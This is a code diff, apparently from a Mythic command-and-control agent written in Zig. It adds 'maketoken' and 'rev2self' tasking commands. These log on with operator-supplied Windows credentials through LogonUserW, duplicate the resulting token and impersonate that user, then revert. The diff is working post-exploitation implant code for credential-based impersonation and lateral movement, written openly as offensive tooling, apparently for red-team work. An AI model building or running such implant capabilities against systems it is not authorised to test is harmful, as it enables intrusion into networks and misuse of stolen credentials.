@@ -4,6 +4,7 @@ const build_options = @import("build_options");
 const types = @import("types.zig");
 const json = std.json;
 const base64 = std.base64;
+const windows = std.os.windows;
 const Allocator = std.mem.Allocator;
 const Io = std.Io;
 const ArrayList = std.ArrayList;
@@ -11,15 +12,52 @@ const ArrayList = std.ArrayList;
 const MythicTask = types.MythicTask;
 const MythicResponse = types.MythicResponse;
 
+const advapi32 = if (builtin.os.tag == .windows) struct {
+        pub extern "advapi32" fn LogonUserW(
+        lpszUsername: [*:0]const u16,
+        lpszDomain: [*:0]const u16,
+        lpszPassword: [*:0]const u16,
+        dwLogonType: windows.DWORD,
+        dwLogonProvider: windows.DWORD,
+        phToken: *windows.HANDLE,
+    ) callconv(.winapi) windows.BOOL;
+
+    pub extern "advapi32" fn ImpersonateLoggedOnUser(
+        hToken: windows.HANDLE,
+    ) callconv(.winapi) windows.BOOL;
+
+    pub extern "advapi32" fn DuplicateTokenEx(
+        hExistingToken: windows.HANDLE,
+        dwDesiredAccess: windows.DWORD,
+        lpTokenAttributes: ?*anyopaque,
+        ImpersonationLevel: windows.DWORD,
+        TokenType: windows.DWORD,
+        phNewToken: *windows.HANDLE,
+    ) callconv(.winapi) windows.BOOL;
+
+    pub extern "advapi32" fn RevertToSelf() callconv(.winapi) windows.BOOL;
+} else struct {};
+
 pub const CommandExecutor = struct {
     allocator: Allocator,
     io: Io,
+    impersonation_token: if (builtin.os.tag == .windows) ?windows.HANDLE else void =
+        if (builtin.os.tag == .windows) null else {},
 
     pub fn init(allocator: Allocator, io: Io) CommandExecutor {
         return CommandExecutor{
             .allocator = allocator,
             .io = io,
         };
+    }
+
+    pub fn deinit(self: *CommandExecutor) void {
+        if (builtin.os.tag == .windows) {
+            if (self.impersonation_token) |token| {
+                windows.CloseHandle(token);
+                self.impersonation_token = null;
+            }
+        }
     }
 
     pub fn executeTask(self: *CommandExecutor, task: MythicTask) !MythicResponse {
@@ -61,6 +99,18 @@ pub const CommandExecutor = struct {
         if (comptime build_options.deletedirectory) {
             if (std.mem.eql(u8, task.command, "deletedirectory")) {
                 return try self.deleteDirectory(task);
+            }
+        }
+        // maketoken without rev2self is incomplete, so we also include rev2self
+        // if maketoken is enabled at compile time
+        if (builtin.os.tag == .windows) {
+            if (comptime build_options.maketoken) {
+                if (std.mem.eql(u8, task.command, "maketoken")) {
+                    return try self.executeMakeToken(task);
+                }
+                if (std.mem.eql(u8, task.command, "rev2self")) {
+                    return try self.executeRevToSelf(task);
+                }
             }
         }
         if (comptime build_options.portscan) {
@@ -355,6 +405,168 @@ pub const CommandExecutor = struct {
         return MythicResponse{
             .task_id = task.id,
             .user_output = try std.fmt.allocPrint(self.allocator, "Deleted directory: {s}", .{path}),
+            .completed = true,
+            .status = "completed",
+        };
+    }
+
+    fn executeMakeToken(self: *CommandExecutor, task: MythicTask) !MythicResponse {
+        if (comptime builtin.os.tag != .windows) {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = "make_token command is only supported on Windows",
+                .completed = true,
+                .status = "error",
+            };
+        }
+
+        const LOGON32_LOGON_NEW_CREDENTIALS: windows.DWORD = 9;
+        const LOGON32_PROVIDER_DEFAULT: windows.DWORD = 0;
+        const TOKEN_ALL_ACCESS: windows.DWORD = 0xF01FF;
+        const SecurityImpersonation: windows.DWORD = 2;
+        const TokenImpersonation: windows.DWORD = 2;
+
+        const MakeTokenParams = struct {
+            username: []const u8,
+            domain: []const u8,
+            password: []const u8,
+            logon_type: ?u32 = null,
+        };
+
+        const parsed = try json.parseFromSlice(MakeTokenParams, self.allocator, task.parameters, .{});
+        defer parsed.deinit();
+
+        const p = parsed.value;
+        const logon_type: windows.DWORD = @intCast(p.logon_type orelse LOGON32_LOGON_NEW_CREDENTIALS);
+
+        const username_w = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, p.username);
+        defer self.allocator.free(username_w);
+        const domain_w = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, p.domain);
+        defer self.allocator.free(domain_w);
+        const password_w = try std.unicode.utf8ToUtf16LeAllocZ(self.allocator, p.password);
+        defer self.allocator.free(password_w);
+
+        // Before making a new token, revert to self if we are already 
+        // impersonating to avoid handle leaks and other weird insanity.
+        if (self.impersonation_token) |old| {
+            _ = advapi32.RevertToSelf();
+            windows.CloseHandle(old);
+            self.impersonation_token = null;
+        }
+
+        var h_token: windows.HANDLE = undefined;
+        if (advapi32.LogonUserW(
+            username_w,
+            domain_w,
+            password_w,
+            logon_type,
+            LOGON32_PROVIDER_DEFAULT,
+            &h_token,
+        ) == windows.BOOL.FALSE) {
+            const err = windows.GetLastError();
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(
+                    self.allocator,
+                    "LogonUserW failed: error code {d}",
+                    .{@intFromEnum(err)},
+                ),
+                .completed = true,
+                .status = "error",
+            };
+        }
+        defer windows.CloseHandle(h_token); //close primary keep dup
+
+        var h_dup: windows.HANDLE = undefined;
+        if (advapi32.DuplicateTokenEx(
+            h_token,
+            TOKEN_ALL_ACCESS,
+            null,
+            SecurityImpersonation,
+            TokenImpersonation,
+            &h_dup,
+        ) == windows.BOOL.FALSE) {
+            const err = windows.GetLastError();
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(
+                    self.allocator,
+                    "DuplicateTokenEx failed: error code {d}",
+                    .{@intFromEnum(err)},
+                ),
+                .completed = true,
+                .status = "error",
+            };
+        }
+
+        if (advapi32.ImpersonateLoggedOnUser(h_dup) == windows.BOOL.FALSE) {
+            const err = windows.GetLastError();
+            windows.CloseHandle(h_dup);
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(
+                    self.allocator,
+                    "ImpersonateLoggedOnUser failed: error code {d}",
+                    .{@intFromEnum(err)},
+                ),
+                .completed = true,
+                .status = "error",
+            };
+        }
+
+        self.impersonation_token = h_dup;
+
+        return MythicResponse{
+            .task_id = task.id,
+            .user_output = try std.fmt.allocPrint(
+                self.allocator,
+                "Impersonating {s}\\{s} (logon type {d})",
+                .{ p.domain, p.username, logon_type },
+            ),
+            .completed = true,
+            .status = "completed",
+        };
+    }
+
+    fn executeRevToSelf(self: *CommandExecutor, task: MythicTask) !MythicResponse {
+        if (comptime builtin.os.tag != .windows) {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = "rev2self is Windows-only",
+                .completed = true,
+                .status = "error",
+            };
+        }
+
+        if (self.impersonation_token == null) {
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = "No active impersonation token",
+                .completed = true,
+                .status = "error",
+            };
+        }
+
+        if (advapi32.RevertToSelf() == windows.BOOL.FALSE) {
+            const err = windows.GetLastError();
+            return MythicResponse{
+                .task_id = task.id,
+                .user_output = try std.fmt.allocPrint(
+                    self.allocator,
+                    "RevertToSelf failed: error code {d}",
+                    .{@intFromEnum(err)},
+                ),
+                .completed = true,
+                .status = "error",
+            };
+        }
+
+        windows.CloseHandle(self.impersonation_token.?);
+        self.impersonation_token = null;
+
+        return MythicResponse{
+            .task_id = task.id,
+            .user_output = "Reverted to original token",
             .completed = true,
             .status = "completed",
         };
